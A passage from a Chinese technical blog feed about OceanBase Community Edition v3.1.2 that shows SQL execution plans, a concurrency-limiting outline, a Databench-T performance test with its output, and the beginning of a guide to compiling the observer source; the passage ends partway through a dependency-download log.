[bmsql_district.d_street_1], [bmsql_district.d_street_2], [bmsql_district.d_city], [bmsql_district.d_state], [bmsql_district.d_zip]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([bmsql_district.d_name], [bmsql_district.d_street_1], [bmsql_district.d_street_2], [bmsql_district.d_city], [bmsql_district.d_state], [bmsql_district.d_zip]), partitions(p1)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.009</span> sec)</span><br></pre></td></tr></table></figure></div>
<p>实际执行计划:</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> plan_id, plan_depth, plan_line_id, operator, name, <span class="keyword">rows</span>, cost, property</span><br><span class="line"><span class="keyword">FROM</span> oceanbase.gv$plan_cache_plan_explain</span><br><span class="line"><span class="keyword">WHERE</span> tenant_id<span class="operator">=</span><span class="number">1001</span> <span class="keyword">AND</span> ip <span class="operator">=</span> <span class="string">&#x27;127.0.0.1&#x27;</span> <span class="keyword">AND</span> port<span class="operator">=</span><span class="number">2882</span> <span class="keyword">AND</span> plan_id<span class="operator">=</span><span class="number">10</span>;</span><br></pre></td></tr></table></figure></div>
<h4 id="SQL-3">SQL 3</h4>
<p>解析执行计划:</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">(root<span class="variable">@127</span><span class="number">.1</span>) [tpcc] <span class="number">21</span>:<span class="number">20</span>:<span class="number">14</span><span class="operator">&gt;</span> EXPLAIN</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="built_in">SUM</span>(ol_amount) <span class="keyword">AS</span> sum_ol_amount</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> bmsql_order_line</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">WHERE</span> ol_w_id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> ol_d_id <span class="operator">=</span> <span class="number">7</span> <span class="keyword">AND</span> ol_o_id <span class="operator">=</span> <span class="number">2572</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> \G</span><br><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">Query Plan: <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="operator">|</span>ID<span class="operator">|</span>OPERATOR       <span class="operator">|</span>NAME            <span class="operator">|</span>EST. <span class="keyword">ROWS</span><span class="operator">|</span>COST<span class="operator">|</span></span><br><span class="line"><span class="comment">----------------------------------------------------</span></span><br><span class="line"><span class="operator">|</span><span class="number">0</span> <span class="operator">|</span>SCALAR <span class="keyword">GROUP</span> <span class="keyword">BY</span><span class="operator">|</span>                <span class="operator">|</span><span class="number">1</span>        <span class="operator">|</span><span class="number">45</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">1</span> <span class="operator">|</span> <span class="keyword">TABLE</span> SCAN    <span class="operator">|</span>bmsql_order_line<span class="operator">|</span><span class="number">13</span>       <span class="operator">|</span><span class="number">43</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"></span><br><span class="line">Outputs <span class="operator">&amp;</span> filters:</span><br><span class="line"><span class="comment">-------------------------------------</span></span><br><span class="line">  <span class="number">0</span> <span class="operator">-</span> output([T_FUN_SUM(bmsql_order_line.ol_amount)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      <span class="keyword">group</span>(nil), agg_func([T_FUN_SUM(bmsql_order_line.ol_amount)])</span><br><span class="line">  <span class="number">1</span> <span class="operator">-</span> output([bmsql_order_line.ol_amount]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([bmsql_order_line.ol_amount]), partitions(p1)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.024</span> sec)</span><br></pre></td></tr></table></figure></div>
<p>实际执行计划:</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> plan_id, plan_depth, plan_line_id, operator, name, <span class="keyword">rows</span>, cost, property</span><br><span class="line"><span class="keyword">FROM</span> oceanbase.gv$plan_cache_plan_explain</span><br><span class="line"><span class="keyword">WHERE</span> tenant_id<span class="operator">=</span><span class="number">1001</span> <span class="keyword">AND</span> ip <span class="operator">=</span> <span class="string">&#x27;127.0.0.1&#x27;</span> <span class="keyword">AND</span> port<span class="operator">=</span><span class="number">2882</span> <span class="keyword">AND</span> plan_id<span class="operator">=</span><span class="number">40</span>;</span><br></pre></td></tr></table></figure></div>
<p>注：实际执行计划并未记录，问题仍在调查中。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">(root<span class="variable">@127</span><span class="number">.1</span>) [oceanbase] <span class="number">21</span>:<span class="number">28</span>:<span class="number">14</span><span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%plan_cache%&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name                       <span class="operator">|</span> <span class="keyword">Value</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> ob_enable_plan_cache                <span class="operator">|</span> <span class="keyword">ON</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ob_plan_cache_evict_high_percentage <span class="operator">|</span> <span class="number">90</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ob_plan_cache_evict_low_percentage  <span class="operator">|</span> <span class="number">50</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ob_plan_cache_percentage            <span class="operator">|</span> <span class="number">5</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------+-------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.004</span> sec)</span><br><span class="line"></span><br><span class="line">(root<span class="variable">@127</span><span class="number">.1</span>) [oceanbase] <span class="number">21</span>:<span class="number">39</span>:<span class="number">14</span><span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> oceanbase.gv$plan_cache_plan_explain limit <span class="number">1</span>;</span><br><span class="line"><span class="keyword">Empty</span> <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br><span class="line"></span><br><span class="line">(root<span class="variable">@127</span><span class="number">.1</span>) [oceanbase] <span class="number">21</span>:<span class="number">43</span>:<span class="number">59</span><span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> oceanbase.__all_virtual_plan_cache_plan_explain limit <span class="number">1</span>;</span><br><span class="line">ERROR <span class="number">1146</span> (<span class="number">42</span>S02): <span class="keyword">Table</span> <span class="string">&#x27;oceanbase.__all_virtual_plan_cache_plan_explain&#x27;</span> doesn<span class="string">&#x27;t exist</span></span><br></pre></td></tr></table></figure></div>
<h3 id="Practice-3-使用-OceanBase-的-Outline-对-其中一条-SQL-进行限流（限制并发为-1）">Practice 3: 使用 OceanBase 的 Outline 对 其中一条 SQL 进行限流（限制并发为 1）</h3>
<p>以 SQL 3 为例，创建outline，并限定并发为1:</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">use tpcc;</span><br><span class="line"><span class="keyword">create</span> outline ol_bmsql_order_line <span class="keyword">on</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="comment">/*+ max_concurrent(1) */</span> <span class="built_in">SUM</span>(ol_amount) <span class="keyword">AS</span> sum_ol_amount</span><br><span class="line"><span class="keyword">FROM</span> bmsql_order_line</span><br><span class="line"><span class="keyword">WHERE</span> ol_w_id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> ol_d_id <span class="operator">=</span> <span class="number">7</span> <span class="keyword">AND</span> ol_o_id <span class="operator">=</span> <span class="number">2572</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure></div>
<p>到此，测试基本完成，流程全部跑通，但由于资源有限，以后再找机会在3-3-3集群进行测试。</p>
<h2 id="相关资料">相关资料</h2>
<ul>
<li><a class="link"   href="https://www.modb.pro/db/327631" >OceanBase 技术征文大赛第二期正式开启！快来释放你的原力！ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a href="https://shawnyan.cn/2021/oceanbase-obcp-v2-exam/">OceanBase OBCP 考试经验小结</a></li>
<li><a href="https://shawnyan.cn/2022/oceanbase/ob-v3.1.2-install-single-node/">【OBCP蓝宝书】 基于 OceanBase 社区版 v3.1.2 搭建单机测试环境的三种方法</a></li>
<li><a href="https://shawnyan.cn/2022/oceanbase/ob-v3.1.2-compile-observer/">【OBCP蓝宝书】 基于 CentOS 7.9 编译 OceanBase 社区版 v3.1.2 的 observer 源码</a></li>
<li><a href="https://shawnyan.cn/2022/oceanbase/ob-v3.1.2-perf-testing-with-databench-t/">OB测试 | 使用 Databench-T 对 OceanBase 社区版 v3.1.2 进行性能测试</a></li>
</ul>
<p>本文零零洒洒写了四天，自己动手写技术文章才发现想要做到日更确实是一件蛮有挑战的事情。</p>
<p>2022-03-05<br>
ShawnYan</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/337531" >https://www.modb.pro/db/337531 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>OceanBase</category>
        <category>OB v3</category>
      </categories>
      <tags>
        <tag>oceanbase</tag>
        <tag>obcp</tag>
        <tag>oceanbase 社区版</tag>
        <tag>ob v3</tag>
        <tag>obd</tag>
        <tag>explain</tag>
      </tags>
  </entry>
  <entry>
    <title>OB测试 | 使用 Databench-T 对 OceanBase 社区版 v3.1.2 进行性能测试</title>
    <url>/2022/oceanbase/ob-v3.1.2-perf-testing-with-databench-t/</url>
    <content><![CDATA[<p><a class="link"   href="https://www.modb.pro/wiki/34" >OceanBase <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>是由蚂蚁集团完全自主研发的企业级分布式关系数据库，基于分布式架构和通用服务器、实现了金融级可靠性及数据一致性，拥有100%的知识产权，始创于2010年。OceanBase具有数据强一致、高可用、高性能、在线扩展、高度兼容SQL标准和主流关系数据库、低成本等特点。</p>
<p>Databench-T 工具，是国内首个事务型数据库性能测试工具，已于 <a class="link"   href="https://www.modb.pro/db/336094" >2月17日由信通院宣布正式开源 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。</p>
<img  alt="ob-databench-word-art.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220302-ec2f7b2b-6cf2-4495-8776-bd1c4811a235.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="环境准备">环境准备</h2>
<blockquote>
<p>CentOS Linux release 7.9.2009 (Core)<br>
openjdk 1.8<br>
OceanBase CE v3.1.2<br>
databench-t</p>
</blockquote>
<h2 id="启动-OceanBase-数据库">启动 OceanBase 数据库</h2>
<p>由于资源有限，本文中的测试只是流程上的演示。<br>
这里我们使用 OceanBase CE v3.1.2 Docker版进行测试，使用方法请参考文章：<br>
<a href="https://shawnyan.cn/2022/oceanbase/ob-v3.1.2-install-single-node/">【OBCP蓝宝书】 基于 OceanBase 社区版 v3.1.2 搭建单机测试环境的三种方法</a></p>
<p>启动并连接OB：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -pv /data/obce</span><br><span class="line">docker run -p 2881:2881 -v /data/obce:/root/ob --name obce -d shawnyan/obce-mini:v3.1.2_ce</span><br><span class="line">mysql -uroot -h127.1 -P2881 -c</span><br></pre></td></tr></table></figure></div>
<p>连接成功日志：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">mysql -uroot -h127.1 -P2881 -c</span></span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 3221487633</span><br><span class="line">Server version: 5.7.25 OceanBase 3.1.2 (r10000392021123010-d4ace121deae5b81d8f0b40afbc4c02705b7fc1d) (Built Dec 30 2021 02:47:29)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">(root@127.1) [(none)] 10:50:18&gt; select version(),now();</span><br><span class="line">+--------------------+---------------------+</span><br><span class="line">| version()          | now()               |</span><br><span class="line">+--------------------+---------------------+</span><br><span class="line">| 3.1.2-OceanBase CE | 2022-03-02 09:50:29 |</span><br><span class="line">+--------------------+---------------------+</span><br><span class="line">1 row in set (0.002 sec)</span><br><span class="line"></span><br><span class="line">(root@127.1) [(none)] 10:50:29&gt;</span><br></pre></td></tr></table></figure></div>
<h2 id="测试工具准备">测试工具准备</h2>
<ol>
<li>安装JDK</li>
</ol>
<p>Databench-T 源码是由Java编写，故需要安装JDK，这里按最低要求安装JDK 1.8。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum install -y java-1.8.0-openjdk-devel</span><br></pre></td></tr></table></figure></div>
<p>安装完成，查看JDK版本:</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">java -version</span></span><br><span class="line">openjdk version &quot;1.8.0_322&quot;</span><br><span class="line">OpenJDK Runtime Environment (build 1.8.0_322-b06)</span><br><span class="line">OpenJDK 64-Bit Server VM (build 25.322-b06, mixed mode)</span><br></pre></td></tr></table></figure></div>
<ol start="2">
<li>克隆Databench-T源码</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://gitee.com/caict-bigdata/databench-t.git</span><br></pre></td></tr></table></figure></div>
<ol start="3">
<li>修改数据库连接信息</li>
</ol>
<p>由于代码库中已经提供了编译好的jar包，所以这里跳过Databench-T源码编译，直接准备开始测试。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cd databench-t</span><br><span class="line">vi soft/application.properties</span><br></pre></td></tr></table></figure></div>
<p>修改数据库连接信息：</p>
<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">main.datasource.url=jdbc:mysql://127.1:2881/findpt?useSSL=false&amp;autoReconnect=true</span></span><br><span class="line"><span class="string">main.datasource.username=root</span></span><br><span class="line"><span class="string">main.datasource.password=</span></span><br></pre></td></tr></table></figure></div>
<ol start="4">
<li>导入表结构和初始数据</li>
</ol>
<p>由于该测试工具是适配MySQL和Oracle的，这里针对OceanBase做了微调，主要去掉了显示指定表引擎。<br>
代码可参考链接：<br>
<a class="link"   href="https://gitee.com/shawnyan/databench-t/tree/shawnyan-master-patch-98085" >https://gitee.com/shawnyan/databench-t/tree/shawnyan-master-patch-98085 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>导入步骤：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行业务测试数据库脚本</span></span><br><span class="line">source sql/mysql/businesstest_database.sql;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行本地应用数据库脚本</span></span><br><span class="line">source sql/mysql/local_database.sql;</span><br></pre></td></tr></table></figure></div>
<h2 id="测试流程演示">测试流程演示</h2>
<p>测试流程共分为3步：</p>
<ol>
<li>配置加载</li>
<li>数据初始化</li>
<li>测试执行</li>
</ol>
<p>具体演示如下：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Step 1:</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">java -Dfile.encoding=utf-8 -jar ./ftdb.jar master --spring.config.location = ./application.properties</span></span><br><span class="line">应用启动配置加载加载成功！</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Step 2:</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">java -Dfile.encoding=utf-8 -jar ./ftdb.jar init 1001 --spring.config.location = ./application.properties</span></span><br><span class="line">应用启动配置加载加载成功！</span><br><span class="line">数据初始化开始 ...</span><br><span class="line">初始化branch（网点）表，记录数 100 ，耗时  98 ms</span><br><span class="line">初始化sjno（科目）表，记录数 1000 ，耗时  229 ms</span><br><span class="line">初始化customer（客户）表，记录数 2000 ，耗时  823 ms</span><br><span class="line">初始化account（账户）表，记录数 10000 ，耗时  1 second 880 ms</span><br><span class="line">初始化salarylist（代发工资）表，记录数 25 ，耗时  38 ms</span><br><span class="line">更新汇总科目余额，耗时  105 ms</span><br><span class="line">更新汇总客户资产余额，耗时  112 ms</span><br><span class="line">数据初始化结束，总耗时  10 seconds 980 ms</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Step 3:</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">java -Dfile.encoding=utf-8 -jar ./ftdb.jar <span class="built_in">test</span> 1001 1 RR --spring.config.location = ./application.properties</span></span><br><span class="line">应用启动配置加载加载成功！</span><br><span class="line">测试执行开始</span><br><span class="line">开始执行一致性测试：2022-03-01 18:10:02</span><br><span class="line">结束执行一致性测试：2022-03-01 18:10:02</span><br><span class="line">开始执行业务测试：2022-03-01 18:10:02</span><br><span class="line">结束执行业务测试：2022-03-01 18:10:49</span><br><span class="line">开始执行一致性测试：2022-03-01 18:10:57</span><br><span class="line">结束执行一致性测试：2022-03-01 18:10:57</span><br><span class="line">开始执行资产盘点：2022-03-01 18:10:57</span><br><span class="line">结束执行资产盘点：2022-03-01 18:10:57</span><br><span class="line"></span><br><span class="line">数据配置：</span><br><span class="line">    网点数100，科目数10，客户数2000，账户数10000，</span><br><span class="line">运行配置：</span><br><span class="line">    转账交易：5000笔，转账线程：10；</span><br><span class="line">    账户查询：5000笔，查询线程：10；</span><br><span class="line">    代发工资：25条(13个代发网点，重复代发10次，共125笔)，代发线程：5；</span><br><span class="line">    账户存款：500笔，存款线程：10；</span><br><span class="line">    账户取款：500笔，取款线程：10；</span><br><span class="line">    资产盘点：1笔，盘点线程：1；</span><br><span class="line">业务测试明细：</span><br><span class="line">    测试总耗时： 55 seconds 927 ms</span><br><span class="line">    10线程并发转账交易5000笔，总耗时 22 seconds 28 ms，平均耗时 44 ms，最大耗时 708 ms，TPS每秒 227</span><br><span class="line">    10线程并发账户查询5000笔，总耗时 17 seconds 740 ms，平均耗时 35 ms，最大耗时 613 ms，TPS每秒 294</span><br><span class="line">    10线程并发账户存款500笔，总耗时 3 seconds 357 ms，平均耗时 67 ms，最大耗时 623 ms，TPS每秒 166</span><br><span class="line">    10线程并发账户取款500笔，总耗时 3 seconds 397 ms，平均耗时 67 ms，最大耗时 633 ms，TPS每秒 166</span><br><span class="line">    5线程并发代发工资125笔(13个代发网点，重复代发10次，共125笔)，总耗时 2 seconds 796 ms，平均耗时 107 ms，最大耗时 541 ms</span><br><span class="line">    资产盘点成功，总耗时 53 ms</span><br><span class="line">ACID测试明细：</span><br><span class="line">    一致性测试2笔，成功2笔，失败0笔；</span><br><span class="line">    原子性测试16笔，成功16笔，失败0笔；</span><br><span class="line">    隔离性测试10笔，成功0笔，失败10笔；</span><br><span class="line">    持久性测试1笔，成功1笔，失败0笔；</span><br></pre></td></tr></table></figure></div>
<p>以上，就是 OceanBase 社区版 v3.1.2 的性能测试演示，请参考。</p>
<h2 id="相关资料">相关资料</h2>
<ul>
<li><a class="link"   href="https://www.modb.pro/db/327631" >OceanBase 技术征文大赛第二期正式开启！快来释放你的原力！ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a href="https://shawnyan.cn/2021/oceanbase-obcp-v2-exam/">OceanBase OBCP 考试经验小结</a></li>
<li><a href="https://shawnyan.cn/2022/oceanbase/ob-v3.1.2-install-single-node/">【OBCP蓝宝书】 基于 OceanBase 社区版 v3.1.2 搭建单机测试环境的三种方法</a></li>
<li><a href="https://shawnyan.cn/2022/oceanbase/ob-v3.1.2-compile-observer/">【OBCP蓝宝书】 基于 CentOS 7.9 编译 OceanBase 社区版 v3.1.2 的 observer 源码</a></li>
<li><a href="https://shawnyan.cn/2022/oceanbase/ob-v3.1.2-sql-explain/">OB练习 | 查看 OceanBase 执行计划</a></li>
</ul>
<p>ShawnYan<br>
2022-03-02</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/336696" >https://www.modb.pro/db/336696 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>OceanBase</category>
        <category>OB v3</category>
      </categories>
      <tags>
        <tag>oceanbase</tag>
        <tag>mariadb</tag>
        <tag>oceanbase 社区版</tag>
        <tag>ob v3</tag>
        <tag>性能测试</tag>
        <tag>Databench-T</tag>
      </tags>
  </entry>
  <entry>
    <title>【OBCP蓝宝书】 基于 CentOS 7.9 编译 OceanBase 社区版 v3.1.2 的 observer 源码</title>
    <url>/2022/oceanbase/ob-v3.1.2-compile-observer/</url>
    <content><![CDATA[<p><a href="https://shawnyan.cn/2022/oceanbase/ob-v3.1.2-install-single-node/">上篇文章</a> 提到，如何使用OBD来搭建单机集群环境。<br>
本文将基于此，继续演示如何编译最新版（OB CE v3.1.2）源码。</p>
<p>Oceanbase已将源码分别发布于GitHub与Gitee，地址如下：</p>
<ul>
<li><a class="link"   href="https://github.com/oceanbase/oceanbase.git" >https://github.com/oceanbase/oceanbase.git <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://gitee.com/oceanbase/oceanbase.git" >https://gitee.com/oceanbase/oceanbase.git <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<img  alt="ob-build-word-art.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220302-8506d038-1418-425e-bf94-fe56f067d545.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="Step-1-下载源码，安装依赖">Step 1: 下载源码，安装依赖</h2>
<p>安装编译源码需要的依赖：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum install -y gcc wget python-devel openssl-devel xz-devel mysql-devel</span><br></pre></td></tr></table></figure></div>
<p>为加速下载，这里使用gitee的代码库，并且只下载一层版本的代码。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载源码</span></span><br><span class="line">git clone https://gitee.com/oceanbase/oceanbase.git -b v3.1.2_CE --depth 1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看提交日志</span></span><br><span class="line">cd oceanbase/</span><br><span class="line">git log</span><br></pre></td></tr></table></figure></div>
<p>代码提交日志如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">commit d4ace121deae5b81d8f0b40afbc4c02705b7fc1d (grafted, HEAD, tag: v3.1.2_CE)</span><br><span class="line">Author: godyangfight &lt;godyangfight@gmail.com&gt;</span><br><span class="line">Date:   Thu Dec 30 10:21:45 2021 +0800</span><br><span class="line"></span><br><span class="line">    Fix restore_follower_replica ERROR table type not expecte</span><br></pre></td></tr></table></figure></div>
<h2 id="Step-2-执行构建">Step 2: 执行构建</h2>
<h3 id="在正式开始构建之前，需要先下载开发工具：">在正式开始构建之前，需要先下载开发工具：</h3>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cd oceanbase/deps/3rd</span><br><span class="line">sh dep_create.sh</span><br></pre></td></tr></table></figure></div>
<p>日志如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sh dep_create.sh</span><br><span class="line">check dependencies profile for el7.x86_64... FOUND</span><br><span class="line">check repository address in profile... http://mirrors.aliyun.com/oceanbase/development-kit/el/7/x86_64/</span><br><span class="line">download dependencies...</span><br><span class="line">download package &lt;devdeps-gtest-1.8.0-3.el7.x86_64.rpm&gt;... SUCCESS</span><br><span class="line">unpack package &lt;devdeps-gtest-1.8.0-3.el7.x86_64.rpm&gt;... SUCCESS</span><br><span class="line">download package &lt;devdeps-isa-l-static-2.22.0-3.el7.x86_64.rpm&gt;... SUCCESS</span><br><span class="line">unpack package &lt;devdeps-isa-l-static-2.22.0-3.el7.x86_64.rpm&gt;... SUCCESS</span><br><span class="line">download package &lt;devdeps-libcurl-static-7.29.0-3.el7.x86_64.rpm&gt;... SUCCESS</span><br><span class="line">unpack package &lt;devdeps-libcurl-static-7.29.0-3.el7.x86_64.rpm&gt;... SUCCESS</span><br><span class="line">download package &lt;devdeps-libunwind-static-1.5.0-3.el7.x86_64.rpm&gt;... SUCCESS</span><br><span class="line">unpack package &lt;devdeps-libunwind-static-1.5.0-3.el7.x86_64.rpm&gt;... SUCCESS</span><br><span class="line">download package &lt;devdeps-mariadb-connector-c-3.1.12-3.el7.x86_64.rpm&gt;... SUCCESS</span><br><span class="line">unpack package &lt;devdeps-mariadb-connector-c-3.1.12-3.el7.x86_64.rpm&gt;... SUCCESS</span><br><span class="line">download package &lt;devdeps-openssl-static-1.0.1e-3.el7.x86_64.rpm&gt;... SUCCESS</span><br><span class="line">unpack package &lt;devdeps-openssl-static-1.0.1e-3.el7.x86_64.rpm&gt;... SUCCESS</span><br><span class="line">download package &lt;devdeps-libaio-0.3.112-3.el7.x86_64.rpm&gt;... SUCCESS</span><br><span class="line">unpack package &lt;devdeps-libaio-0.3.112-3.el7.x86_64.rpm&gt;... SUCCESS</span><br><span class="line">download package 